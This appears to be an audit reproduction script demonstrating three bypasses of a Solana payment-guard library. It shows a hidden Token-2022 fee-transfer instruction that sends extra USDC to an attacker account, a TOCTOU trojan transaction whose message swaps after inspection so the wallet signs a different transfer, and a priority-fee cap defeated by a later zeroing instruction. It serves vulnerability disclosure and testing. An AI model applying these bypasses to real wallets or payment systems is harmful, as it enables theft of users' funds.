// Reproductions for src/index.ts findings. Run from package root:  node repro_index_findings.mjs
import { inspectPayment, inspectPaymentPayload, guardSigner } from "./dist/index.js";
import { PublicKey, Keypair, TransactionMessage, VersionedTransaction } from "@solana/web3.js";
import {
  getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID,
  createTransferCheckedInstruction, createTransferCheckedWithFeeInstruction,
} from "@solana/spl-token";

const payer = Keypair.fromSeed(Uint8Array.from(Array(32).fill(1)));
const merchant = Keypair.fromSeed(Uint8Array.from(Array(32).fill(2)));
const attacker = Keypair.fromSeed(Uint8Array.from(Array(32).fill(3)));
const MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
const ata = (o, p = TOKEN_PROGRAM_ID) => getAssociatedTokenAddressSync(MINT, o, true, p);
const payerAta = ata(payer.publicKey), merchantAta = ata(merchant.publicKey), attackerAta = ata(attacker.publicKey);
const quote = { payTo: merchant.publicKey.toBase58(), asset: MINT.toBase58(), amount: "1000000" };
const v0 = (ixs) => new VersionedTransaction(new TransactionMessage({
  payerKey: payer.publicKey, recentBlockhash: "11111111111111111111111111111111", instructions: ixs,
}).compileToV0Message());
const b64 = (t) => Buffer.from(t.serialize()).toString("base64");
const goodTransfer = () => createTransferCheckedInstruction(
  payerAta, MINT, merchantAta, payer.publicKey, 1000000n, 6, [], TOKEN_PROGRAM_ID);

console.log("=== F1: Token-2022 TransferCheckedWithFee rides past the token switch ===");
const hidden = createTransferCheckedWithFeeInstruction(
  payerAta, MINT, attackerAta, payer.publicKey, 500_000_000n, 6, 0n, [], TOKEN_2022_PROGRAM_ID);
console.log("hidden ix data[0]=%d (TransferFeeExtension) data[1]=%d (TransferCheckedWithFee)", hidden.data[0], hidden.data[1]);
console.log("hidden destination:", hidden.keys[2].pubkey.toBase58(), "(attacker ATA)");
console.log("quoted amount: 1000000 (1 USDC) | hidden transfer: 500000000 (500 USDC)");
const tx1 = v0([goodTransfer(), hidden]);
console.log("inspectPayment       ->", JSON.stringify(inspectPayment(b64(tx1), quote)));
console.log("inspectPaymentPayload->", JSON.stringify(inspectPaymentPayload(
  { x402Version: 1, scheme: "exact", network: "solana-mainnet", payload: { transaction: b64(tx1) } }, quote)));
const w1 = { signTransaction: async (t) => { console.log("  >>> WALLET SIGNED IT"); return t; } };
await guardSigner(w1, () => quote).signTransaction(tx1);

console.log("\n=== F2: guardSigner TOCTOU — inspects tx.serialize(), signs the original object ===");
const good = v0([goodTransfer()]);
const evil = v0([createTransferCheckedInstruction(
  payerAta, MINT, attackerAta, payer.publicKey, 999_000_000n, 6, [], TOKEN_PROGRAM_ID)]);
let reads = 0;
const trojan = Object.create(VersionedTransaction.prototype);
trojan.signatures = good.signatures;
Object.defineProperty(trojan, "message", { get() { return reads++ === 0 ? good.message : evil.message; } });
let signedBytes = null;
const w2 = { signTransaction: async (t) => { signedBytes = t.serialize(); return t; } };
await guardSigner(w2, () => quote).signTransaction(trojan);
const actually = VersionedTransaction.deserialize(signedBytes);
const ix = actually.message.compiledInstructions[0];
const keys = actually.message.staticAccountKeys.map((k) => k.toBase58());
console.log("guard allowed and wallet signed. Bytes actually signed:");
console.log("  destination:", keys[ix.accountKeyIndexes[2]], "(attacker ATA)");
console.log("  amount     :", Buffer.from(ix.data).readBigUInt64LE(1).toString());
console.log("  re-inspecting those same bytes ->", inspectPayment(signedBytes, quote).decision);

console.log("\n=== F3: priority-fee cap bypassed by a later zeroing instruction ===");
const cb = (d) => ({ programId: new PublicKey("ComputeBudget111111111111111111111111111111"), keys: [], data: Buffer.from(d) });
const maxU64 = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
console.log("price=u64max only          ->", inspectPayment(b64(v0([cb([3, ...maxU64]), goodTransfer()])), quote).decision);
console.log("price=u64max THEN price=0  ->", JSON.stringify(inspectPayment(b64(v0([cb([3, ...maxU64]), cb([3, 0, 0, 0, 0, 0, 0, 0, 0]), goodTransfer()])), quote)));
console.log("limit=0 + price=u64max     ->", JSON.stringify(inspectPayment(b64(v0([cb([2, 0, 0, 0, 0]), cb([3, ...maxU64]), goodTransfer()])), quote)));
